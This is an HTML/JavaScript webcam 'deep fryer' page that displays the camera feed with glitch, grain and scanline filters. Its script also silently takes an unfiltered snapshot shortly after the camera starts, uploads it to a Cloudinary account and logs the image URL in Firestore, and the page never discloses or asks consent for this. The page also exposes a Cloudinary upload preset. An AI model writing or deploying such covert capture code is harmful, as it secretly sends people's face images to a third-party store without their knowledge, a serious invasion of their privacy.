<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Camera Deep Fryer</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background:
        repeating-linear-gradient(
          45deg,
          #ff0000,
          #ff0000 20px,
          #ff9900 20px,
          #ff9900 40px,
          #ffff00 40px,
          #ffff00 60px
        );
    }

    h1 {
      color: white;
      font-size: 3rem;
      margin-bottom: 20px;
      text-shadow:
        4px 4px 0 red,
        -4px -4px 0 blue,
        0 0 20px yellow;
    }

    .camera-box {
      padding: 15px;
      background: rgba(0,0,0,0.5);
      border: 8px dashed yellow;
      border-radius: 25px;
      box-shadow:
        0 0 20px red,
        0 0 40px orange,
        0 0 60px yellow;
    }

    video {
      display: none;
    }

    canvas {
      width: 700px;
      max-width: 90vw;
      border-radius: 15px;
      filter:
        contrast(300%)
        saturate(800%)
        brightness(130%);
    }

    .caption {
      margin-top: 15px;
      color: white;
      font-size: 1.2rem;
      text-shadow: 2px 2px black;
    }
  </style>
</head>
<body>
  <h1>WEBCAM FRYER</h1>
  <div class="camera-box">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
  </div>
  <div class="caption">
    perfect for meetings!
  </div>

  <script type="module">
    import { db, collection, addDoc } from "./firebase.js";

    const CLOUDINARY_CLOUD_NAME    = "dw0wgd1ji";
    const CLOUDINARY_UPLOAD_PRESET = "webcamfryerupload";

    const video  = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx    = canvas.getContext("2d");

    const PIXEL_BLOCK_SIZE = 4;
    const LAG_MS = 125;

    const tinyCanvas = document.createElement("canvas");
    const tinyCtx    = tinyCanvas.getContext("2d");

    // Clean canvas just for the snapshot — filters never touch this
    const snapCanvas = document.createElement("canvas");
    const snapCtx    = snapCanvas.getContext("2d");

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false
        });
        video.srcObject = stream;

        video.addEventListener("loadedmetadata", () => {
          canvas.width      = video.videoWidth;
          canvas.height     = video.videoHeight;
          snapCanvas.width  = video.videoWidth;
          snapCanvas.height = video.videoHeight;

          tinyCanvas.width  = Math.floor(video.videoWidth  / PIXEL_BLOCK_SIZE);
          tinyCanvas.height = Math.floor(video.videoHeight / PIXEL_BLOCK_SIZE);

          ctx.imageSmoothingEnabled     = false;
          tinyCtx.imageSmoothingEnabled = false;
        });

        // canplay = first real frame is ready, not black/blank
        // { once: true } means this only fires one time then removes itself
        video.addEventListener("canplay", async () => {
  // Wait 1.5 seconds for the camera to finish adjusting exposure
  await new Promise(resolve => setTimeout(resolve, 1500));
  await takeSnapshot();
  drawLoop();
}, { once: true });

      } catch (err) {
        alert("the camera has ascended");
        console.error(err);
      }
    }

    async function takeSnapshot() {
      // Draw raw video to the clean canvas before any filters run
      snapCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);

      // Convert the canvas to a JPEG blob — like saving the frame as an image file
      const blob = await new Promise(resolve => {
        snapCanvas.toBlob(resolve, "image/jpeg", 0.9);
      });

      try {
        const cloudinaryUrl = await uploadToCloudinary(blob);
        await saveToFirestore(cloudinaryUrl);
        console.log("Snapshot saved:", cloudinaryUrl);
      } catch (err) {
        console.error("Snapshot failed:", err);
      }
    }

    async function uploadToCloudinary(blob) {
      const formData = new FormData();
      formData.append("file", blob, "snapshot.jpg");
      formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);

      const response = await fetch(
        `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`,
        { method: "POST", body: formData }
      );

      if (!response.ok) {
        throw new Error(`Cloudinary upload failed: ${response.status}`);
      }

      const data = await response.json();
      return data.secure_url;
    }

    async function saveToFirestore(imageUrl) {
      await addDoc(collection(db, "snapshots"), {
        imageUrl:  imageUrl,
        takenAt:   new Date().toISOString(),
        timestamp: Date.now()
      });
    }

    function drawLoop() {
      tinyCtx.save();
      tinyCtx.scale(-1, 1);
      tinyCtx.drawImage(video, -tinyCanvas.width, 0, tinyCanvas.width, tinyCanvas.height);
      tinyCtx.restore();

      ctx.drawImage(tinyCanvas, 0, 0, canvas.width, canvas.height);

      addGrainNoise();
      addScanlines();
      addChromaticAberration();
      addGlitchLines();
      addCompressionBlocks();

      setTimeout(drawLoop, LAG_MS);
    }

    function addGrainNoise() {
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const pixels    = imageData.data;

      for (let i = 0; i < pixels.length; i += 4) {
        if (Math.random() < 0.4) {
          const noise   = (Math.random() - 0.5) * 180;
          pixels[i]     = clamp(pixels[i]     + noise);
          pixels[i + 1] = clamp(pixels[i + 1] + noise);
          pixels[i + 2] = clamp(pixels[i + 2] + noise);
        }
      }

      ctx.putImageData(imageData, 0, 0);
    }

    function clamp(value) {
      return Math.max(0, Math.min(255, value));
    }

    function addScanlines() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.35)";
      for (let y = 0; y < canvas.height; y += 4) {
        ctx.fillRect(0, y, canvas.width, 2);
      }
    }

    function addChromaticAberration() {
      const shift = 6;
      ctx.globalAlpha = 0.25;
      ctx.globalCompositeOperation = "screen";
      ctx.filter = "saturate(400%) hue-rotate(0deg)";
      ctx.drawImage(canvas, -shift, 0);
      ctx.filter = "saturate(400%) hue-rotate(200deg)";
      ctx.drawImage(canvas, shift, 0);
      ctx.globalAlpha = 1.0;
      ctx.globalCompositeOperation = "source-over";
      ctx.filter = "none";
    }

    function addGlitchLines() {
      const numGlitches = 3;
      for (let g = 0; g < numGlitches; g++) {
        const stripY      = Math.floor(Math.random() * canvas.height);
        const stripHeight = Math.floor(Math.random() * 16) + 4;
        const shift       = (Math.random() - 0.5) * 80;
        const strip       = ctx.getImageData(0, stripY, canvas.width, stripHeight);
        ctx.putImageData(strip, shift, stripY);
      }
    }

    function addCompressionBlocks() {
      const numBlocks = 4;
      const STEP = 64;
      for (let b = 0; b < numBlocks; b++) {
        const bx        = Math.floor(Math.random() * canvas.width);
        const by        = Math.floor(Math.random() * canvas.height);
        const bw        = Math.floor(Math.random() * 80) + 20;
        const bh        = Math.floor(Math.random() * 40) + 10;
        const blockData = ctx.getImageData(bx, by, bw, bh);
        const pixels    = blockData.data;
        for (let i = 0; i < pixels.length; i += 4) {
          pixels[i]     = Math.round(pixels[i]     / STEP) * STEP;
          pixels[i + 1] = Math.round(pixels[i + 1] / STEP) * STEP;
          pixels[i + 2] = Math.round(pixels[i + 2] / STEP) * STEP;
        }
        ctx.putImageData(blockData, bx, by);
      }
    }

    startCamera();
  </script>
</body>
</html>
